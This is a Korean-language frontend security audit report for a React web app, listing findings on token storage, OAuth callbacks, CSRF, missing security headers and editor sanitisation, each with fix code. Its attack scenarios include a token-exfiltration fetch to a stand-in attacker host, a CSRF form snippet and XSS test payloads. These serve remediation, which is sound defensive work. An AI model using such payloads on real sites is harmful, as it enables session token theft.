# 보안 점검 리포트 (프론트) — 2026-05-10

| 항목 | 내용 |
|---|---|
| 점검일 | 2026-05-10 |
| 점검 범위 | frontend-v2 (React 19 / Vite 7 / TypeScript) — SPA 코드, 빌드 설정 |
| 경로 | `C:\Users\user\projects\frontend-v2` |
| 점검 영역 | 토큰 저장, XSS, CSRF, CSP, 의존성, 빌드 산출물, 인증 플로우 |
| 관련 문서 | 백엔드 점검 결과는 [security-audit-2026-05-10-backend.md](security-audit-2026-05-10-backend.md) |

> ℹ️ 이 문서는 WaggleAPIServer 레포 `docs/`에 위치하지만 작업 대상은 frontend-v2 레포다. 작업 시 참조 경로는 모두 frontend-v2 기준 상대 경로로 표기되어 있다.

---

## 0. 한눈에 보기

| ID | 제목 | 심각도 | 비고 |
|---|---|---|---|
| C1 | Access 토큰을 localStorage에 영속 저장 | 🔴 Critical | |
| C2 | OAuth 콜백이 access 토큰을 URL 쿼리스트링으로 전달 | 🔴 Critical | BE와 동시 작업 필요 |
| H5 | axios 전역 `withCredentials: true` | 🟠 High | |
| H6 | CSP / Referrer-Policy 등 보안 헤더 부재 | 🟠 High | 인프라 (FE 서빙 측) |
| M9 | 편집 폼이 팀 선택 UI / `teamId` 페이로드를 유지 | 🟡 Medium | 정책-UI 불일치 + 회귀 위험 |
| M15 | Tiptap viewer에 `html: false` 미설정 | 🟡 Medium | |
| M16 | Tiptap `Link` 프로토콜 allow-list 부재 | 🟡 Medium | |
| L5 | `public/deploy-check.txt` 빌드 메타데이터 노출 | 🟢 Low | |

---

## 1. Critical

### C1. Access 토큰을 localStorage에 영속 저장

- **위치**: `src/stores/authStore.ts:10-22`
- **심각도**: Critical
- **영향**: 모든 인증된 사용자

#### 현재 코드

```typescript
export const useAuthStore = create<AuthState>()(
  persist(
    (set) => ({
      accessToken: null,
      setAccessToken: (token) => set({ accessToken: token }),
      logout: () => set({ accessToken: null }),
    }),
    {
      name: 'auth-storage',
      storage: createJSONStorage(() => localStorage),
    },
  ),
);
```

#### 문제

Zustand `persist` 미들웨어가 access JWT를 `localStorage['auth-storage']`에 평문으로 영속 저장한다. localStorage는 XSS에 직접 노출되는 저장소이며, 백엔드는 발급된 access 토큰을 폐기할 수 있는 메커니즘이 없다 (TTL 만료까지 최대 1시간 유효).

OAuth2 BCP (RFC 9700)와 OWASP Web Security Testing Guide 모두 토큰을 `localStorage`/`sessionStorage`에 저장하지 않을 것을 권고한다.

#### 공격 시나리오

1. 향후 어떤 경로로든 (마크다운 렌더링 버그, 의존성 CVE, 외부 분석 스크립트 도입, 광고 SDK 등) XSS가 한 줄이라도 실행되면:
   ```javascript
   fetch('https://attacker.example/x?t=' + localStorage['auth-storage'])
   ```
   한 번에 토큰 유출 → 1시간 동안 API 전체 사용 가능.

2. 더 큰 문제는 **공격자가 victim의 브라우저에서 `/auth/refresh`를 호출**하면 (refresh 쿠키가 same-origin이면 자동 동봉), 새 access 토큰을 무한 발급받을 수 있다는 것. TTL 1시간이 사실상 무력화됨.

3. 공격자는 토큰을 가지고 victim의 모든 데이터(프로필, DM, 지원서, 팀 정보)에 접근하고, 프로필을 변조하거나 DM을 보낼 수 있다.

#### 수정 방법

`persist` 제거하고 access 토큰은 메모리(Zustand 기본 상태)에만 보관:

```typescript
import { create } from 'zustand';

interface AuthState {
  accessToken: string | null;
  setAccessToken: (token: string) => void;
  logout: () => void;
}

export const useAuthStore = create<AuthState>((set) => ({
  accessToken: null,
  setAccessToken: (token) => set({ accessToken: token }),
  logout: () => set({ accessToken: null }),
}));
```

새로고침 시 토큰 복원은 이미 구현된 `/auth/refresh` (httpOnly 쿠키 기반, `src/App.tsx:25` 부근의 silent re-auth)가 처리한다. App 마운트 시 한 번 호출 → 새 access 토큰을 메모리에 set.

#### 검증 방법

- 로그인 후 DevTools → Application → Local Storage 비어있어야 함
- 새로고침 시 자동 재인증 동작 확인 (`/auth/refresh` 호출)
- 다른 탭 닫고 새 탭으로 같은 사이트 열면 재로그인 필요 (각 탭이 독립 메모리)
- DevTools 콘솔에서 `localStorage`/`sessionStorage` 어디에도 JWT 패턴(`eyJ...`)이 없어야 함

#### 참고

- [OWASP - HTML5 Local Storage and XSS](https://owasp.org/www-community/HTML5_Security_Cheat_Sheet)
- [RFC 9700 — OAuth 2.0 Security Best Current Practice](https://datatracker.ietf.org/doc/rfc9700/)

---

### C2. OAuth 콜백이 access 토큰을 URL 쿼리스트링으로 전달 (프론트 작업분)

- **위치**: `src/pages/LoginPage.tsx:12`
- **심각도**: Critical
- **영향**: OAuth 로그인하는 모든 사용자
- **연관**: 백엔드 작업분은 [backend 문서 C2](security-audit-2026-05-10-backend.md#c2-oauth-콜백이-access-토큰을-url-쿼리스트링으로-전달-백엔드-작업분)

#### 현재 동작

백엔드 `OAuth2LoginSuccessHandler`가 OAuth 성공 시 `https://waggle.lol/login?accessToken=eyJ...` 로 redirect → 프론트의 `LoginPage`가 `searchParams.get('accessToken')`으로 토큰을 수신한다.

```typescript
// 현재 코드 (개념)
const [searchParams] = useSearchParams();
const accessToken = searchParams.get('accessToken');
if (accessToken) {
  setAccessToken(accessToken);
  navigate('/');
}
```

#### 문제

URL 쿼리스트링으로 토큰이 흐를 때 발생하는 유출 채널:

1. **브라우저 history**: `chrome://history` 검색에 영구 보관, 공용 PC 사용자 다음 사람이 열람
2. **Referer 헤더**: 로그인 직후 페이지가 외부 리소스(CDN 이미지, 외부 링크 클릭) 요청 시 `Referer: https://waggle.lol/login?accessToken=eyJ...` 가 그 서버로 송신
3. **분석 SDK**: GA, Sentry, Datadog RUM은 URL 캡처가 기본 동작 → 3rd-party에 토큰 송출
4. **북마크/스크린샷 공유**: 사용자가 그 URL 그대로 북마크하거나 캡처 공유
5. **C1과 결합**: 프론트가 받자마자 localStorage에 저장 → 디스크에 영구화

자세한 OAuth 표준 위반 분석은 [백엔드 문서 C2](security-audit-2026-05-10-backend.md#c2-oauth-콜백이-access-토큰을-url-쿼리스트링으로-전달-백엔드-작업분) 참조.

#### 수정 방법 (BE 결정에 따라)

**BE가 Option A (Fragment) 선택 시**

```typescript
// src/pages/LoginPage.tsx
useEffect(() => {
  const fragment = window.location.hash.slice(1);
  const params = new URLSearchParams(fragment);
  const accessToken = params.get('accessToken');
  if (accessToken) {
    setAccessToken(accessToken);
    // 즉시 history에서 제거
    window.history.replaceState(null, '', window.location.pathname);
    navigate('/');
  }
}, []);
```

**BE가 Option B (OTT) 선택 시 — 권장**

```typescript
// src/pages/LoginPage.tsx
useEffect(() => {
  const ott = searchParams.get('ott');
  if (ott) {
    // 즉시 history에서 제거
    window.history.replaceState(null, '', window.location.pathname);
    // OTT 교환
    fetch('/auth/oauth/exchange', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ ott }),
    })
      .then(r => r.json())
      .then(({ accessToken }) => {
        setAccessToken(accessToken);
        navigate('/');
      })
      .catch(() => navigate('/login?error=oauth_exchange_failed'));
  }
}, []);
```

**BE가 Option C (httpOnly cookie) 선택 시**

```typescript
// src/pages/LoginPage.tsx
useEffect(() => {
  // BE가 redirect 시 임시 access 쿠키 set 했다고 가정
  // /auth/me 호출로 인증 확인 + access 토큰 응답 body로 수령
  fetch('/auth/me', { credentials: 'include' })
    .then(r => r.json())
    .then(({ accessToken }) => {
      setAccessToken(accessToken);
      navigate('/');
    });
}, []);
```

#### 검증 방법

- 로그인 후 `chrome://history` 검색에 `accessToken=` 패턴이 남지 않는지 확인
- 로그인 후 외부 링크(예: 게시글 첨부 GitHub URL) 클릭 → DevTools Network에서 `Referer` 헤더에 토큰 없는지 확인
- URL bar에 `?accessToken=...` 가 잠시도 보이지 않거나 즉시 제거되는지 확인

#### ⚠️ 배포 주의

BE/FE 동시 배포 필수. 단계적 전환 시:

1. BE가 한동안 fragment + query 둘 다 송신 → FE는 새 방식 우선, fallback으로 query 사용
2. FE 배포 후 충분한 캐시 기간(2주~) 대기
3. BE에서 query 송신 제거 → FE에서도 fallback 제거

또는 feature flag로 제어.

---

## 2. High

### H5. axios 전역 `withCredentials: true`

- **위치**: `src/api/axiosInstance.ts:5-11`
- **심각도**: High (CSRF 표면)
- **영향**: 인증된 모든 사용자

#### 현재 코드

```typescript
const axiosInstance = axios.create({
  baseURL: import.meta.env.VITE_BASE_URL,
  withCredentials: true,  // ← 모든 요청에 쿠키 동봉
  paramsSerializer: { indexes: null },
});
```

#### 문제

인증은 `Authorization: Bearer <accessToken>` 헤더 기반인데, 모든 API 요청에 쿠키까지 동봉된다. 백엔드 입장에서:

- `Authorization` 헤더를 검증하는 엔드포인트는 안전 (헤더가 없거나 위조면 401)
- 하지만 **refresh 쿠키만으로 인증되는 엔드포인트(`/auth/refresh`)는 CSRF에 취약**:
  ```html
  <!-- 공격자 사이트 evil.example -->
  <img src="https://api.waggle.lol/auth/refresh" />
  <!-- 또는 -->
  <form action="https://api.waggle.lol/auth/refresh" method="POST">
  ```
  victim이 evil.example을 방문하면 브라우저가 자동으로 waggle 쿠키 동봉 → BE가 refresh 처리 → `Set-Cookie`로 새 refresh 쿠키 발급 + 응답 body로 access 토큰. 응답 body는 SOP로 evil 사이트가 못 읽지만, **refresh 쿠키가 갱신되는 부수효과**는 발생. Rotation 도입(BE H7) 시 정상 사용자의 refresh 토큰 무효화 가능.

전역 옵션이라 모든 엔드포인트가 동일한 위험.

#### 수정 방법

전역에서 제거하고 `/auth/refresh` 호출 지점에만 명시 (이미 그렇게 되어있음):

```typescript
// axiosInstance.ts
const axiosInstance = axios.create({
  baseURL: import.meta.env.VITE_BASE_URL,
  // withCredentials 제거
  paramsSerializer: { indexes: null },
});

// 이미 axiosInstance.ts:34-38, auth.ts:16에서
// /auth/refresh 호출 시에는 명시적으로 { withCredentials: true } 전달 중
```

#### 검증 방법

- DevTools Network에서 일반 API 요청(`/posts`, `/users/me` 등) 확인 → `Cookie` 헤더가 없어야 함
- `/auth/refresh` 요청만 `Cookie: refreshToken=...` 동봉되어야 함

---

### H6. CSP / Referrer-Policy 등 보안 헤더 부재 (CloudFront 측)

- **위치**: CloudFront Distribution (`waggle.lol` 서빙)
- **심각도**: High
- **영향**: XSS / Clickjacking / 정보 누설 방어층 부재
- **연관**: API 측 헤더는 [backend 문서 H6](security-audit-2026-05-10-backend.md#h6-api-nginx-csp--referrer-policy-등-보안-헤더-부재)

#### 인프라 전제

프론트는 **S3 정적 호스팅 + CloudFront CDN** 구성. S3는 임의의 응답 헤더를 추가할 수 없으므로(객체 메타데이터 외) 보안 헤더는 **CloudFront 단에서 추가**해야 한다.

#### 문제

`waggle.lol` 응답에 다음 헤더가 누락:

- `Content-Security-Policy` — XSS 시 스크립트 실행/외부 송출 차단
- `Referrer-Policy` — 외부 링크 클릭 시 URL 누출 방지 (C2와 직결)
- `Permissions-Policy` — 카메라/마이크/지오로케이션 등 잠금
- `Strict-Transport-Security` — HTTPS 강제 + HSTS preload
- `X-Frame-Options` 또는 `frame-ancestors` (CSP 일부) — Clickjacking 방어
- `X-Content-Type-Options: nosniff` — MIME sniffing 방지

#### 수정 방법 (권장: Response Headers Policy)

CloudFront의 **Managed Response Headers Policy** 또는 **Custom Response Headers Policy**를 distribution behavior에 attach. AWS Managed에 `Managed-SecurityHeadersPolicy`가 있지만 CSP는 포함 안 됨 → custom policy 만드는 게 정석.

**AWS Console로 만들 때**

CloudFront → Policies → Response headers → Create response headers policy:

```yaml
Name: waggle-frontend-security-headers

Security headers config:
  Strict-Transport-Security:
    Max age: 31536000
    Include subdomains: true
    Preload: true
    Override: true

  Content-Security-Policy:
    Policy: |
      default-src 'self';
      script-src 'self';
      style-src 'self' 'unsafe-inline';
      img-src 'self' data: https:;
      connect-src 'self' https://api.waggle.lol wss://api.waggle.lol;
      font-src 'self' data:;
      frame-ancestors 'none';
      base-uri 'self';
      form-action 'self';
    Override: true

  X-Content-Type-Options:
    Override: true  # nosniff 자동

  Frame options:
    Frame option: DENY
    Override: true

  Referrer policy:
    Referrer policy: strict-origin-when-cross-origin
    Override: true

Custom headers config:
  - Permissions-Policy: camera=(), microphone=(), geolocation=(), interest-cohort=()
    Override: true
```

생성 후 distribution의 default behavior(또는 `/*`)에 **Response headers policy**로 attach.

**Terraform / CDK 사용 시**

```hcl
# Terraform 예시
resource "aws_cloudfront_response_headers_policy" "waggle_security" {
  name = "waggle-frontend-security-headers"

  security_headers_config {
    strict_transport_security {
      access_control_max_age_sec = 31536000
      include_subdomains         = true
      preload                    = true
      override                   = true
    }

    content_security_policy {
      content_security_policy = join("; ", [
        "default-src 'self'",
        "script-src 'self'",
        "style-src 'self' 'unsafe-inline'",
        "img-src 'self' data: https:",
        "connect-src 'self' https://api.waggle.lol wss://api.waggle.lol",
        "font-src 'self' data:",
        "frame-ancestors 'none'",
        "base-uri 'self'",
        "form-action 'self'",
      ])
      override = true
    }

    content_type_options { override = true }

    frame_options {
      frame_option = "DENY"
      override     = true
    }

    referrer_policy {
      referrer_policy = "strict-origin-when-cross-origin"
      override        = true
    }
  }

  custom_headers_config {
    items {
      header   = "Permissions-Policy"
      value    = "camera=(), microphone=(), geolocation=(), interest-cohort=()"
      override = true
    }
  }
}

resource "aws_cloudfront_distribution" "frontend" {
  # ...
  default_cache_behavior {
    response_headers_policy_id = aws_cloudfront_response_headers_policy.waggle_security.id
    # ...
  }
}
```

**대안: CloudFront Functions** (단순 헤더 주입에 충분, Lambda@Edge보다 빠르고 저렴)

```javascript
// CloudFront Function (Viewer Response 트리거)
function handler(event) {
  var response = event.response;
  var headers = response.headers;

  headers['strict-transport-security'] = { value: 'max-age=31536000; includeSubDomains; preload' };
  headers['content-security-policy'] = { value: "default-src 'self'; script-src 'self'; style-src 'self' 'unsafe-inline'; img-src 'self' data: https:; connect-src 'self' https://api.waggle.lol wss://api.waggle.lol; font-src 'self' data:; frame-ancestors 'none'; base-uri 'self'; form-action 'self';" };
  headers['x-content-type-options'] = { value: 'nosniff' };
  headers['x-frame-options'] = { value: 'DENY' };
  headers['referrer-policy'] = { value: 'strict-origin-when-cross-origin' };
  headers['permissions-policy'] = { value: 'camera=(), microphone=(), geolocation=()' };

  return response;
}
```

→ Response Headers Policy가 더 idiomatic하고 관리 용이. CloudFront Functions는 동적 로직 필요할 때.

#### 보조: `index.html` `<meta>` 태그

CloudFront 설정 변경 권한이 없거나 즉시 적용이 필요할 때 백업으로 사용. 단 일부 헤더(HSTS, frame-ancestors 등)는 메타 태그로 효과 없음 — CloudFront 설정이 정석.

```html
<!-- frontend-v2/index.html -->
<meta name="referrer" content="strict-origin-when-cross-origin" />
<meta http-equiv="Content-Security-Policy" content="..." />
```

#### 검증 방법

- https://securityheaders.com 또는 https://observatory.mozilla.org 에 `https://waggle.lol` 입력 → A 등급 이상 목표
- DevTools Network → 응답 헤더에 모든 항목 존재 확인
- CSP 위반 시 콘솔에 `Refused to load ...` 경고 → 기존 기능 회귀 테스트
- CloudFront 캐시 invalidation 필요 (`/*`) — 헤더 변경 후 옛 응답이 캐싱되어 있을 수 있음

#### ⚠️ 주의

CSP는 strict하게 시작하면 기존 기능을 깨기 쉽다. **`Content-Security-Policy-Report-Only` 헤더로 먼저 배포** → 위반 리포트 수집 → 안정화되면 enforcing 모드로 전환. CloudFront Response Headers Policy에서 `Content-Security-Policy-Report-Only` 도 동일하게 설정 가능.

#### 추가 점검 권장 (CloudFront/S3 인프라 자체 — 별도 audit 대상)

이번 점검은 코드 한정이므로 다음은 별도 확인 권장:

- **S3 bucket public access**: `BlockPublicAcls`, `BlockPublicPolicy` 모두 ON. 객체 접근은 OAC(Origin Access Control)로만.
- **CloudFront ↔ S3**: OAI(legacy) 대신 **OAC(2022+)** 사용 중인지 확인. OAI는 SigV4 미지원 등 한계.
- **CloudFront TLS**: Minimum protocol version `TLSv1.2_2021` 이상 (가능하면 `TLSv1.3`).
- **S3 bucket encryption**: SSE-S3 또는 SSE-KMS 활성화.
- **CloudFront WAF**: 프론트 도메인에 AWS WAF managed rule (Common, KnownBadInputs) 적용 여부.
- **CloudFront access logging**: 활성화 + 로그 버킷 접근 제한.
- **S3 versioning**: 정적 파일 롤백/감사 용도로 권장.
- **Distribution custom error pages**: SPA의 경우 403/404 → `/index.html` (200) 처리되지만 보안 헤더는 그대로 적용되는지 확인.

---

## 3. Medium

### M9. 편집 폼이 팀 선택 UI / `teamId` 페이로드를 유지

- **위치**:
  - `src/pages/PostFormPage.tsx:62` (form reset에 `teamId` 포함)
  - `src/pages/PostFormPage.tsx:124-128` (`<Controller name="teamId" ...>` 편집 모드에서도 노출)
  - `src/pages/PostFormPage.tsx:93-105` (submit 시 `formattedData`에 `teamId` 포함되어 PUT 페이로드 송신)
- **심각도**: Medium (정책-UI 불일치 + 회귀 위험)
- **영향**: 모집글 작성자

#### 정책

서버 정책: **모집글 수정 시 팀 변경 불가**. PR #116 (`post-team-immutable`)에서 백엔드 [PostUpdateRequest](https://github.com/sillysillyman/WaggleAPIServer/blob/main/src/main/kotlin/io/waggle/waggleapiserver/domain/post/dto/request/PostUpdateRequest.kt)에서 `teamId` 필드를 제거하여 적용됨.

#### 현재 동작

```typescript
// src/pages/PostFormPage.tsx:59-72
useEffect(() => {
  if (isEditMode && myPostData) {
    reset({
      teamId: myPostData.team.id,  // ← 편집 시에도 teamId 포함
      title: myPostData.title,
      ...
    });
  }
}, [isEditMode, myPostData, reset]);

// 편집 모드에서도 팀 선택 컨트롤이 렌더됨
<Controller
  name="teamId"
  control={control}
  rules={{ required: true }}
  render={({ field }) => (
    <FieldMaster ... />
  )}
/>

// onSubmit:
const formattedData = { ...data, recruitments: ... };  // teamId 포함
updatePosts({ postId: Number(postId), postData: formattedData });
```

→ PUT `/posts/{id}` 페이로드에 `teamId` 송신. 현재 백엔드는 이를 무시(`PostUpdateRequest`에 필드 없음)하지만:

#### 문제

1. **정책-UI 불일치**: 서버는 팀 변경을 금지하지만 UI는 변경 가능한 것처럼 보여줌. 사용자가 팀을 바꾸고 저장 → "성공" 응답 + 실제로는 팀 그대로 → 혼란/버그 리포트.
2. **방어 깊이(Defense in Depth) 부재**: 백엔드 `PostUpdateRequest`에 누군가 무심코 `teamId` 필드를 다시 추가하면(예: 향후 "팀 이전" 기능 추가 시) 즉시 IDOR 변형 취약점이 됨. 클라이언트 측에서도 정책을 enforce하면 회귀 보호.
3. **불필요한 페이로드**: BE가 무시하는 필드를 매번 송신 → 의도 불명확.

#### 수정 방법

편집 모드에서는 팀 선택 UI를 숨기고 `teamId`를 페이로드에서 제외.

```typescript
// src/pages/PostFormPage.tsx
useEffect(() => {
  if (isEditMode && myPostData) {
    reset({
      // teamId 제외 (편집 모드에선 의미 없음)
      title: myPostData.title,
      recruitments: ...,
      content: myPostData.content,
    });
  }
}, [isEditMode, myPostData, reset]);

// 팀 선택 컨트롤은 작성 모드에서만
{!isEditMode && (
  <Controller
    name="teamId"
    control={control}
    rules={{ required: true }}
    render={({ field }) => (
      <FieldMaster ... />
    )}
  />
)}

// 또는 편집 모드일 때 팀 정보를 read-only로 표시:
{isEditMode && (
  <div className="...">
    <span>팀: {myPostData.team.name}</span>
  </div>
)}

// onSubmit: 편집 시 teamId 제거
const onSubmit = (data: FormValues) => {
  const formattedData = {
    ...data,
    recruitments: data.recruitments.map(...)
  };

  if (isEditMode) {
    const { teamId, ...updatePayload } = formattedData;
    updatePosts({ postId: Number(postId), postData: updatePayload });
  } else {
    createPosts(formattedData);
  }
};
```

타입 분리 권장 — `PostCreateFormValues` (teamId 포함) / `PostUpdateFormValues` (teamId 제외)로 폼 값 타입을 나누면 컴파일러가 위반을 잡음.

#### 검증 방법

- 모집글 편집 페이지 진입 → 팀 선택 UI가 보이지 않거나 read-only로 표시
- 편집 폼 submit → DevTools Network에서 PUT 페이로드 확인 → `teamId` 필드 없음
- 작성 페이지(`/posts/new` 등)에서는 여전히 팀 선택 동작

---

### M15. Tiptap viewer에 `html: false` 미설정

- **위치**: `src/components/Field/FieldViewer.tsx:12`, `src/components/Field/markdownExtensions.ts:9`
- **심각도**: Medium

#### 문제

게시글/지원서 본문은 마크다운으로 저장되고 Tiptap의 `@tiptap/markdown` 확장으로 렌더링됨. 기본 설정에서 마크다운에 포함된 raw HTML(`<script>`, `<iframe>`, `<img onerror>`)이 통과될 수 있다. StarterKit도 기본적으로 일부 HTML을 허용.

이미지 노드는 `markdownExtensions.ts:9`에서 `https?:`/`data:image/...` 스킴 화이트리스트로 보호되지만, raw HTML 통과 시 그 보호를 우회해서 임의 스크립트 삽입 가능.

#### 수정 방법

```typescript
import { Markdown } from 'tiptap-markdown';

// markdownExtensions.ts 또는 viewer 설정 부근
Markdown.configure({
  html: false,  // raw HTML 차단
  transformPastedText: true,
  transformCopiedText: true,
});

// StarterKit도 HTML 노드 비활성
StarterKit.configure({
  // 필요시 특정 노드 비활성
});
```

추가 방어: 렌더링된 HTML을 DOMPurify로 한번 더 sanitize:

```typescript
import DOMPurify from 'dompurify';

const safeHtml = DOMPurify.sanitize(editor.getHTML(), {
  ALLOWED_TAGS: ['p', 'br', 'strong', 'em', 'u', 's', 'a', 'img', 'ul', 'ol', 'li', 'h1', 'h2', 'h3', 'blockquote', 'code', 'pre'],
  ALLOWED_ATTR: ['href', 'src', 'alt', 'title', 'target', 'rel'],
});
```

#### 검증 방법

- 게시글 본문에 `<script>alert(1)</script>` 또는 `<img src=x onerror=alert(1)>` 입력 → 렌더링 시 실행되지 않아야 함
- 마크다운 raw HTML 패턴 (`<iframe src="...">`) → 텍스트로만 보여야 함

---

### M16. Tiptap `Link` 프로토콜 allow-list 부재

- **위치**: `src/components/Field/FieldViewer.tsx:18-25`
- **심각도**: Medium

#### 현재 코드

```typescript
Link.configure({
  openOnClick: true,
  HTMLAttributes: { target: '_blank', rel: 'noopener noreferrer' },
})
```

#### 문제

Tiptap v3 `Link`는 기본적으로 `javascript:`/`data:` URI를 차단하지만, **이는 기본 `protocols` 옵션에 의존**. 명시적 allow-list가 없으면 향후 라이브러리 동작 변경에 노출.

`[클릭](javascript:alert(1))` 같은 markdown이 외부에서 import되거나 직접 입력될 때, 라이브러리 기본값이 바뀌면 실행될 수 있음.

#### 수정 방법

```typescript
Link.configure({
  openOnClick: true,
  protocols: ['http', 'https', 'mailto', 'tel'],
  isAllowedUri: (url, ctx) => {
    try {
      const parsed = new URL(url, window.location.origin);
      return /^(https?:|mailto:|tel:)/i.test(parsed.protocol);
    } catch {
      return false;
    }
  },
  HTMLAttributes: { target: '_blank', rel: 'noopener noreferrer nofollow' },
})
```

`rel="nofollow"` 추가는 SEO/스팸 대응 차원.

#### 검증 방법

- 본문에 `[click](javascript:alert(1))` 입력 → 렌더링되지 않거나 클릭해도 실행 안 됨
- `[google](https://google.com)` → 정상 동작

---

## 4. Low / Info

### L5. `public/deploy-check.txt` 빌드 메타데이터 노출

- **위치**: `frontend-v2/public/deploy-check.txt`
- **심각도**: Low (정보 누설 minor)

빌드 시점, git SHA, env 등이 평문으로 노출되어 https://waggle.lol/deploy-check.txt 로 누구나 접근 가능. 공격자에게 직접적인 무기는 아니지만 정찰 정보 제공.

#### 수정

운영 빌드에서 제외하거나 인증 필요한 경로로 이동. 헬스체크 용도면 `/api/health`로 옮기고 nginx에서 인증 추가.

---

## 5. 검증된 안전 항목

### 토큰 / 인증
- Refresh 토큰은 httpOnly 쿠키 (BE에서 set, FE는 접근 불가) — XSS로 직접 탈취 불가
- 401 응답 시 자동 `/auth/refresh` 호출 + 한 번만 retry (`originalRequest._retry`) — 무한 루프 방지
- WebSocket OTT는 1회용 (`AuthService.validateAndConsumeWsToken`)
- `Authorization: Bearer` 헤더 방식 (cookie 단독 인증 아님)

### XSS sink
- `dangerouslySetInnerHTML` 직접 사용 없음
- `eval`, `new Function` 사용 없음
- 직접 DOM 조작 (`innerHTML =`) 없음
- Tiptap의 이미지 노드는 `https?:`/`data:image/...` 스킴 allow-list 적용 (M15에서 추가 보강 필요)

### 클라이언트 시크릿
- `import.meta.env.VITE_*` 변수에 시크릿 키 없음 (`VITE_BASE_URL` 등 public한 것만)
- 하드코딩된 API 키 없음

### Open Redirect
- `LoginModal`의 `returnUrl`은 `pathname + search` (same-origin) 만 저장
- React Router `navigate(string)`이 path로 처리 → 외부 도메인 redirect 불가

### 빌드 / 배포
- `vite.config.ts`에 `build.sourcemap` 미설정 → Vite 기본값 false → 운영 dist에 source map 없음
- `public/`에 `.env`, 백업 파일 등 민감 파일 없음 (fonts + deploy-check.txt만)

### 의존성
- React 19.2, React Router 7.12, axios 1.13.4, Vite 7.2, @tanstack/react-query 5.90 — 모두 최신
- 위험한 마크다운 파서(`marked`, `showdown`) 미사용
- Tiptap 3.x (단, M15/M16 설정 보강 필요)

### postMessage / iframe
- `window.postMessage` 리스너 없음
- iframe 임베드 없음

---

## 6. 권장 처리 순서

### Phase 1 — 즉시 (1주 이내)

작은 fix, 큰 효과.

1. **C1** — `authStore`의 Zustand `persist` 제거 (1시간)
2. **H5** — 전역 `withCredentials` 제거 (30분)

### Phase 2 — 단기 (2주 이내)

조율 또는 회귀 테스트 필요.

3. **C2** — BE와 협의 → OTT 또는 fragment 패턴 적용. BE/FE 동시 배포 (3-5일)
4. **H6** — 인프라: CSP Report-Only 배포 → 안정화 → enforcing (1-2주, 점진적)
5. **M9** — 편집 폼에서 팀 선택 UI 제거 + 페이로드에서 `teamId` 제외 (반나절)
6. **M15** — Tiptap `html: false` (반나절)
7. **M16** — Tiptap `Link` allow-list (반나절)

### Phase 3 — 정리 (여유 있을 때)

8. **L5** — `deploy-check.txt` 처리 (10분)

---

## 7. 점검 방법론

이 점검은 다음 방법으로 수행됨:

- 백엔드와 함께 4개의 병렬 sub-agent로 영역 분담 (인증인가 / 입력검증·인젝션 / 인프라·설정 / 프론트)
- 각 agent는 직접 코드를 read하여 분석 (자동화 스캐너 미사용)
- OWASP Top 10, RFC 9700 (OAuth BCP), OWASP Cheat Sheet Series 기준

다음 점검 시 이 문서와 비교하여 회귀/신규 항목 분류 가능.

---

## 8. 참고 자료

- [OWASP Top 10 (2021)](https://owasp.org/Top10/)
- [OWASP - HTML5 Local Storage and XSS](https://owasp.org/www-community/HTML5_Security_Cheat_Sheet)
- [RFC 9700 — OAuth 2.0 Security Best Current Practice](https://datatracker.ietf.org/doc/rfc9700/)
- [OWASP Cheat Sheet — DOM Based XSS Prevention](https://cheatsheetseries.owasp.org/cheatsheets/DOM_based_XSS_Prevention_Cheat_Sheet.html)
- [content-security-policy.com — CSP 빌더](https://content-security-policy.com/)
- [Mozilla Web Security — HTTP Headers](https://infosec.mozilla.org/guidelines/web_security)
- [Tiptap Link Extension](https://tiptap.dev/docs/editor/extensions/marks/link)
